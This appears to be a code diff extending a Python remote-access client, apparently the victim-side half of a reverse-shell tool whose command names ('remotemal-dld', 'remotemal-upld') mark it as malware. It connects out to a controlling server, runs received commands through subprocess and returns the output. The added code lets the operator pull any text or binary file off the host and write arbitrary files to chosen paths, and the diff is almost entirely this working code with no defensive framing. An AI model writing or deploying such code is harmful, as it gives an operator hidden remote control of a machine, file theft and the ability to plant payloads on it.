@@ -16,6 +16,7 @@ class RemoteClient(object):
        self.CharSet=CharSet         #Character Set For Encoding And Decoding
        self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
        self.TimeOut=TimeOut         #TimeOut which is the Maximum Exexcution Time For Command Execution.
+       self.RecvBuffer = list()
 
     def Connect(self):
         #Connect To The Server:
@@ -24,30 +25,137 @@ class RemoteClient(object):
 
     def send(self,data):
         #Send data as chunks 
-        for i in range(0,len(data),self.Buffering):
-            chunk =data[i:i+self.Buffering]
-            if chunk=="EOF":
-                self.client_socket.send(chunk.lower().encode(self.CharSet))
-            else:
-                self.client_socket.send(chunk.encode(self.CharSet)) 
-        
-        #Delay before sending data end
-        time.sleep(5)
-        self.client_socket.send("EOF".encode(self.CharSet))
-        time.sleep(3)
-        #Delay after sending data end
+        null_added_data = self.AppendNull(data)
+        for i in range(0,len(null_added_data),self.Buffering):
+            chunk =null_added_data[i:i+self.Buffering]
+            self.client_socket.send(chunk.encode(self.CharSet)) 
         return None
 
+
     def recv(self):
-        #recieve data as chunks
-        data=""
-        while True:
-            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
-            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
-                break
+        data = ""
+        flag = True
+
+        dequeue = self.DequeueHandler()
+        if(not dequeue):
+            while flag:
+                chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)
+
+                if(len(chunk) >=  1):
+                    if(chunk[-1] == '\0'):
+                        flag = False
+                data += chunk
+        
+            return self.EnqueueHandler(data.split('\0')) 
+        return dequeue
+
+    def bin_send(self,bin_data):
+        #Send data as chunks 
+        null_added_data = self.bin_AppendNull(bin_data)
+        for i in range(0,len(null_added_data),self.Buffering):
+            chunk =null_added_data[i:i+self.Buffering]
+            self.client_socket.send(chunk) 
+
+        return None
+
+    def bin_recv(self):
+        bin_data = b""
+        flag = True
+
+        while flag:
+            chunk = self.client_socket.recv(self.Buffering)
+            if(len(chunk) >=  1):
+                if(chunk[-1] == 0):
+                    flag = False
+            
+            bin_data += chunk
+    
+        return bin_data
+
+    def EnqueueHandler(self,next_data):
+        for data in next_data:
+            if(not data):
+                continue
+            self.RecvBuffer.append(data)
+        return self.DequeueHandler()
+
+    def DequeueHandler(self):
+        if(len(self.RecvBuffer) != 0):
+            return self.ByteOrderMark(self.RecvBuffer.pop(0)).replace('\\x00','\x00')
+        return None
+
+    def ByteOrderMark(self,data):
+        return data.lstrip('\ufeff') #Remove BOM charcter if it exists.
+
+    def DownloadTextFile(self,file_path):
+
+        # Check if the file exists
+        if os.path.exists(file_path):
+            self.send("True")
+            is_dld_path_exist = self.recv()
+            if(is_dld_path_exist == "True"):
+                with open(file_path,mode = 'r') as file:
+                    file_content = file.read()
+                    self.send(file_content)
             else:
-                data+=chunk
-        return data
+                return None
+        else:
+            self.send("False")
+
+
+    def DownloadedBinaryFile(self,file_path):
+        # Check if the file exists
+        if os.path.exists(file_path):
+            
+            self.send("True")
+            is_dld_path_exist = self.recv()
+            if(is_dld_path_exist == "True"):
+                with open(file_path,mode = 'rb') as file:
+                    file_content = file.read()
+                    self.bin_send(file_content)
+            else:
+                return None
+        else:
+            self.send("False")
+
+    def UploadTextFile(self,file_path):
+        is_file_exist = self.recv()
+        if(is_file_exist == "True"):
+            upld_path = self.recv()
+            file_name = self.recv()
+            if(os.path.exists(upld_path)):
+                self.send("True")
+                with open(upld_path + '/' + file_name,mode='w') as file:
+                    file_content = self.recv()
+                    if(not file_content):
+                        file.write('')
+                    else:
+                        file.write(file_content)
+                self.send("True")
+            else:
+                self.send("False")
+        else:
+            return None
+
+    def UploadBinaryFile(self,file_path):
+        is_file_exist = self.recv()
+        if(is_file_exist == "True"):
+            upld_path = self.recv()
+            file_name = self.recv()
+            if(os.path.exists(upld_path)):
+                self.send("True")
+                with open(upld_path + '/' + file_name,mode='wb') as file:
+                    file_content = self.bin_recv()
+                    if(not file_content):
+                        file.write('')
+                    else:
+                        file.write(file_content)
+                self.send("True")
+            else:
+                self.send("False")
+        else:
+            return None
+
 
     def GetBuffer(self):
         #Recieve the Buffer From Server Side
@@ -62,6 +170,13 @@ class RemoteClient(object):
         self.path=os.getcwd()
         self.send(self.path)
         return None
+
+    def AppendNull(self, data):
+        data = data.replace('\x00','\\x00')
+        return data + '\0'
+
+    def bin_AppendNull(self, bin_data):
+        return bin_data + b'\0'
 
     def Partitions(self):
         #Get the Partitions of the system
@@ -130,6 +245,7 @@ class RemoteClient(object):
             self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")
 
         except Exception as error:
+            self.send("Yes")
             self.send(str(error))
 
     def _exe_Terminal(self,cmd,input="\n"):
@@ -140,12 +256,17 @@ class RemoteClient(object):
             #Creating a new process for remote command execution 
             self.process=subprocess.Popen(cmd_list,universal_newlines=True,cwd=self.path,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             stdout,stderr=self.process.communicate(input=input,timeout=self.TimeOut)
+
+            #Sends the flag for the data is stdout or stderr
+            self.send(stdout) if (stdout) else self.send("Yes") if (stderr) else self.send("No")
             #Sends the output if the command has any output 
             #sends the error if the command has any error
             #Sends <Command Executed successfully> if no output or error for the executed command   
             self.send(stdout) if (stdout) else self.send(stderr) if (stderr) else self.send("Command Executed Sucessfully")
 
+
         except Exception as error:
+            self.send("Yes")
             self.send(error.__str__())
 
     
@@ -160,9 +281,32 @@ class RemoteClient(object):
 
                 
                 cmd=self.recv() #Recieve the command to be executed
+
+                if(not cmd):
+                    continue
                 
                 if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
-                        self.VerifyPath()      #It sets path variable to its previous state if path is not valid   
+                    self.VerifyPath()      #It sets path variable to its previous state if path is not valid   
+
+                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
+                    option = cmd.split()[1]
+                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
+                    if(option == '-t'):
+                        self.DownloadTextFile(file_path)
+                    elif(option == '-b'):
+                        self.DownloadedBinaryFile(file_path)
+                    else:
+                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")
+
+                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
+                    option = cmd.split()[1]
+                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
+                    if(option == '-t'):
+                        self.UploadTextFile(file_path)
+                    elif(option == '-b'):
+                        self.UploadBinaryFile(file_path)
+                    else:
+                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")
 
                 elif(cmd.lower()=="remotequit"):
                     self.close()    #Close the Socket Connection.
@@ -183,12 +327,33 @@ class RemoteClient(object):
             while(True):
 
                 
-
                 cmd=self.recv() #Recieve the command to be executed
 
+                if(not cmd):
+                    continue
 
                 if (cmd.split()[0]=="cd" and len(cmd.split())>=2): #Check wheather the contains cd (change directory) for directory navigation
                     self.VerifyPath()      #It sets path variable to its previous state if path is not valid   
+
+                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
+                    option = cmd.split()[1]
+                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
+                    if(option == '-t'):
+                        self.DownloadTextFile(file_path)
+                    elif(option == '-b'):
+                        self.DownloadedBinaryFile(file_path)
+                    else:
+                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")
+
+                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
+                    option = cmd.split()[1]
+                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
+                    if(option == '-t'):
+                        self.UploadTextFile(file_path)
+                    elif(option == '-b'):
+                        self.UploadBinaryFile(file_path)
+                    else:
+                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")
 
                 elif(cmd.lower()=="remotequit"):
                     self.close()    #Close the Socket Connection.
@@ -214,7 +379,7 @@ class RemoteClient(object):
 
         
 if __name__=="__main__":
-    r=RemoteClient("127.0.0.1",6577)
+    r=RemoteClient("127.0.0.1",5066)
     r.Connect()
     r.SetBuffer()
     r.Partitions()
